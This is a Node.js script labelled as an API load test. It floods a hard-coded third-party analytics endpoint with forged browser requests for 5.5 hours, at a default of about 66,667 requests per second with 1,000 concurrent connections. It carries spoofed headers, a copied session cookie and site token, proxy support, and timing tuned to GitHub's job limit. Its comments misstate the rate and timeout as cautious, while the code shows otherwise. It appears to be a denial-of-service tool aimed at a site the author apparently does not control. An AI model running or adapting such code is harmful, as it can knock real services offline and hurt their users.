import fs from 'fs/promises';
import path from 'path';
import readline from 'readline';
import https from 'https';
import http from 'http';
import { HttpsProxyAgent } from 'https-proxy-agent';

// Configurable constants
const TARGET_URL = process.env.TARGET_URL || 'https://2.52gs.co/cdn-cgi/rum?';
const TEST_DURATION_MINUTES = parseInt(process.env.TEST_DURATION_MINUTES) || 330; // 5.5 hours (leaves 30 min buffer for GitHub's 6-hour limit)
const TARGET_RPS = parseInt(process.env.TARGET_RPS) || 66667; // Limit to 60 requests per second to avoid HTTP 429 WAF bans
const CONCURRENCY_LIMIT = parseInt(process.env.CONCURRENCY_LIMIT) || 1000; // Conservative to avoid IP bans
const REQUEST_TIMEOUT_MS = parseInt(process.env.REQUEST_TIMEOUT_MS) || 5000; // 10 seconds timeout per call
const PROXY_URL = process.env.PROXY_URL || ''; // Optional: proxy URL (e.g. http://user:pass@host:port)

async function runAutomation() {
  const testDurationMs = TEST_DURATION_MINUTES * 60 * 1000;
  const endTime = Date.now() + testDurationMs;

  console.log(`Starting POST API Automation Test`);
  console.log(`Target URL:        ${TARGET_URL}`);
  console.log(`Test Duration:     ${TEST_DURATION_MINUTES} minutes (${(TEST_DURATION_MINUTES / 60).toFixed(1)} hours)`);
  console.log(`Target RPS:        ${TARGET_RPS > 0 ? TARGET_RPS : 'Unlimited'}`);
  console.log(`Concurrency Limit: ${CONCURRENCY_LIMIT}`);
  console.log(`Request Timeout:   ${REQUEST_TIMEOUT_MS}ms`);
  console.log(`Proxy:             ${PROXY_URL || 'None'}`);
  console.log(`----------------------------------------------`);

  const startTime = Date.now();
  let completedCount = 0;
  let successCount = 0;
  let failureCount = 0;


  const responseTimes = [];
  const errors = new Map();
  const statusCodes = new Map();

  let dispatched = 0;
  let activeRequestsCount = 0;

  // Set up client Agent (with optional proxy support)
  const parsedUrl = new URL(TARGET_URL);
  const isHttps = parsedUrl.protocol === 'https:';
  const client = isHttps ? https : http;

  let agent;
  if (PROXY_URL) {
    agent = new HttpsProxyAgent(PROXY_URL, {
      keepAlive: true,
      maxSockets: CONCURRENCY_LIMIT,
    });
  } else {
    agent = new client.Agent({
      keepAlive: true,
      maxSockets: CONCURRENCY_LIMIT,
      keepAliveMsecs: 60000,
    });
  }

  const payload = JSON.stringify({
    "memory": {
      "totalJSHeapSize": 25712678,
      "usedJSHeapSize": 19490026,
      "jsHeapSizeLimit": 4395630592
    },
    "resources": [],
    "referrer": "",
    "eventType": 1,
    "firstPaint": 180,
    "firstContentfulPaint": 180,
    "startTime": 1783784910878.4,
    "versions": {
      "fl": "2024.11.0",
      "js": "2026.6.0",
      "timings": 2
    },
    "pageloadId": "0d47351c-2745-4ac1-8ca9-ce673a64ed29",
    "location": "https://2.52gs.co/",
    "nt": "reload",
    "timingsV2": {
      "nextHopProtocol": "h3",
      "domainLookupStart": 0.6000000089406967,
      "domainLookupEnd": 0.6000000089406967,
      "connectStart": 0.6000000089406967,
      "connectEnd": 0.6000000089406967,
      "requestStart": 1.6000000089406967,
      "responseStart": 30.700000002980232,
      "responseEnd": 33.20000000298023,
      "domInteractive": 378.6000000089407,
      "domComplete": 807.2000000029802,
      "loadEventStart": 807.2000000029802,
      "loadEventEnd": 807.9000000059605,
      "finalResponseHeadersStart": 30.700000002980232,
      "firstInterimResponseStart": 0,
      "transferSize": 5835,
      "decodedBodySize": 15471
    },
    "dt": "",
    "siteToken": "0598640d96264f90b5f25bb535c5eec3",
    "st": 2
  });

  const options = {
    hostname: parsedUrl.hostname,
    port: parsedUrl.port || (isHttps ? 443 : 80),
    path: parsedUrl.pathname + parsedUrl.search,
    method: 'POST',
    agent: agent,
    headers: {
      'accept': '*/*',
      'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
      'content-type': 'application/json',
      'cookie': 'PHPSESSID=up4ksdqgf06efh284o2log3g2q',
      'origin': 'https://2.52gs.co',
      'priority': 'u=1, i',
      'referer': 'https://2.52gs.co/',
      'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
      'content-length': Buffer.byteLength(payload)
    }
  };

  const isTTY = process.stdout.isTTY;

  // Render a visual progress bar (time-based)
  function drawProgressBar() {
    const width = 30;
    const elapsed = Date.now() - startTime;
    const progress = Math.min(elapsed / testDurationMs, 1);
    const filledLength = Math.round(width * progress);
    const emptyLength = width - filledLength;
    const bar = '='.repeat(filledLength) + ' '.repeat(emptyLength);
    const percent = (progress * 100).toFixed(1);

    const elapsedMin = (elapsed / 60000).toFixed(1);
    const totalMin = TEST_DURATION_MINUTES;

    const statsText = `[${bar}] ${percent}% | ${elapsedMin}/${totalMin}min | Reqs: ${completedCount} | OK: ${successCount} | Fail: ${failureCount} | Active: ${activeRequestsCount}`;

    if (isTTY) {
      readline.clearLine(process.stdout, 0);
      readline.cursorTo(process.stdout, 0);
      process.stdout.write(statsText);
    } else {
      console.log(statsText);
    }
  }

  // Throttle CLI progress bar updates to prevent console bottlenecking
  let lastProgressUpdate = 0;
  const updateIntervalMs = isTTY ? 100 : 15000;

  function maybeDrawProgressBar() {
    const now = Date.now();
    if (now - lastProgressUpdate >= updateIntervalMs || now >= endTime) {
      lastProgressUpdate = now;
      drawProgressBar();
    }
  }

  // Dispatch a single HTTP POST request
  function dispatchRequest() {
    return new Promise((resolve) => {
      const requestStartTime = Date.now();
      let timedOut = false;

      const req = client.request(options, (res) => {
        // Consume body to free socket connections
        res.on('data', () => { });
        res.on('end', () => {
          if (timedOut) return;

          const duration = Date.now() - requestStartTime;
          responseTimes.push(duration);

          const status = res.statusCode;
          statusCodes.set(status, (statusCodes.get(status) || 0) + 1);

          if (status >= 200 && status < 300) {
            successCount++;
          } else {
            failureCount++;
            const statusText = `HTTP ${status} ${res.statusMessage || ''}`;
            errors.set(statusText, (errors.get(statusText) || 0) + 1);
          }

          activeRequestsCount--;
          completedCount++;
          maybeDrawProgressBar();
          resolve();
        });
      });

      req.on('error', (err) => {
        if (timedOut) return;

        failureCount++;
        const errMsg = err.code || err.message || err.toString() || 'Unknown Error';
        errors.set(errMsg, (errors.get(errMsg) || 0) + 1);

        activeRequestsCount--;
        completedCount++;
        maybeDrawProgressBar();
        resolve();
      });

      req.setTimeout(REQUEST_TIMEOUT_MS, () => {
        timedOut = true;
        req.destroy();

        failureCount++;
        errors.set('Timeout', (errors.get('Timeout') || 0) + 1);

        activeRequestsCount--;
        completedCount++;
        maybeDrawProgressBar();
        resolve();
      });

      req.end(payload);
    });
  }



  // Duration-based scheduler
  async function startScheduler() {
    while (Date.now() < endTime) {

      // Yield if we hit max active request concurrency
      if (activeRequestsCount >= CONCURRENCY_LIMIT) {
        await new Promise((resolve) => setImmediate(resolve));
        continue;
      }

      // Rate limiting
      if (TARGET_RPS > 0) {
        const elapsedMs = Date.now() - startTime;
        const expectedDispatched = (elapsedMs / 1000) * TARGET_RPS;
        if (dispatched >= expectedDispatched) {
          await new Promise((resolve) => setTimeout(resolve, 1));
          continue;
        }
      }

      dispatched++;
      activeRequestsCount++;
      dispatchRequest();
    }
  }

  async function saveReport() {
    const durationTotalSeconds = ((Date.now() - startTime) / 1000).toFixed(2);

    responseTimes.sort((a, b) => a - b);
    const totalCalls = responseTimes.length;
    const minLatency = totalCalls > 0 ? responseTimes[0] : 0;
    const maxLatency = totalCalls > 0 ? responseTimes[totalCalls - 1] : 0;
    const avgLatency = totalCalls > 0 ? Math.round(responseTimes.reduce((a, b) => a + b, 0) / totalCalls) : 0;
    const medianLatency = totalCalls > 0 ? responseTimes[Math.floor(totalCalls / 2)] : 0;
    const p95Latency = totalCalls > 0 ? responseTimes[Math.floor(totalCalls * 0.95)] : 0;
    const p99Latency = totalCalls > 0 ? responseTimes[Math.floor(totalCalls * 0.99)] : 0;

    const summary = {
      targetUrl: TARGET_URL,
      testDurationMinutes: TEST_DURATION_MINUTES,
      totalRequests: completedCount,
      concurrencyLimit: CONCURRENCY_LIMIT,
      targetRps: TARGET_RPS,
      durationSeconds: parseFloat(durationTotalSeconds),
      requestsPerSecond: parseFloat((completedCount / durationTotalSeconds).toFixed(2)) || 0,
      successCount,
      failureCount,
      successRate: completedCount > 0 ? `${((successCount / completedCount) * 100).toFixed(1)}%` : '0%',

      latencyStatsMs: {
        min: minLatency,
        max: maxLatency,
        avg: avgLatency,
        median: medianLatency,
        p95: p95Latency,
        p99: p99Latency
      },
      statusCodes: Object.fromEntries(statusCodes.entries()),
      errors: Object.fromEntries(errors.entries())
    };

    console.log(`\n=== PERFORMANCE REPORT ===`);
    console.log(`Test Duration:     ${durationTotalSeconds}s`);
    console.log(`Total Requests:    ${completedCount}`);
    console.log(`Requests/Sec:      ${summary.requestsPerSecond}`);
    console.log(`Success Rate:      ${summary.successRate}`);
    console.log(`Min Latency:       ${minLatency}ms`);
    console.log(`Max Latency:       ${maxLatency}ms`);
    console.log(`Avg Latency:       ${avgLatency}ms`);
    console.log(`Median Latency:    ${medianLatency}ms`);
    console.log(`p95 Latency:       ${p95Latency}ms`);
    console.log(`p99 Latency:       ${p99Latency}ms`);

    if (statusCodes.size > 0) {
      console.log(`\nHTTP Status Code Distribution:`);
      for (const [code, count] of statusCodes.entries()) {
        console.log(`  - Status ${code}: ${count}`);
      }
    }

    if (errors.size > 0) {
      console.log(`\nErrors Breakdown:`);
      for (const [errMsg, count] of errors.entries()) {
        console.log(`  - ${errMsg}: ${count}`);
      }
    }

    const reportPath = path.join(process.cwd(), `summary-report-${process.pid}.json`);
    await fs.writeFile(reportPath, JSON.stringify(summary, null, 2), 'utf-8');
    console.log(`\nDetailed report written to: ${reportPath}`);
  }

  // Handle graceful shutdown on Ctrl+C (SIGINT) or SIGTERM
  let shuttingDown = false;
  const handleShutdown = async () => {
    if (shuttingDown) return;
    shuttingDown = true;
    console.log('\n\n[Ctrl+C] Interrupted. Saving report...');
    await saveReport();
    process.exit(0);
  };
  process.on('SIGINT', handleShutdown);
  process.on('SIGTERM', handleShutdown);

  // Run the scheduler and wait until all active requests have completed
  await startScheduler();
  while (activeRequestsCount > 0) {
    await new Promise((resolve) => setTimeout(resolve, 50));
  }

  console.log('\n----------------------------------------------');
  const durationTotalSeconds = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`Execution Completed in ${durationTotalSeconds}s`);

  // Remove shutdown listeners before final save to prevent double trigger
  process.off('SIGINT', handleShutdown);
  process.off('SIGTERM', handleShutdown);

  await saveReport();

  // Always exit 0 — results are in the report artifact
  console.log(`\nTest finished. Check the report artifact for detailed results.`);
  process.exit(0);
}

runAutomation().catch(err => {
  console.error('Fatal error running automation:', err);
  process.exit(1);
});
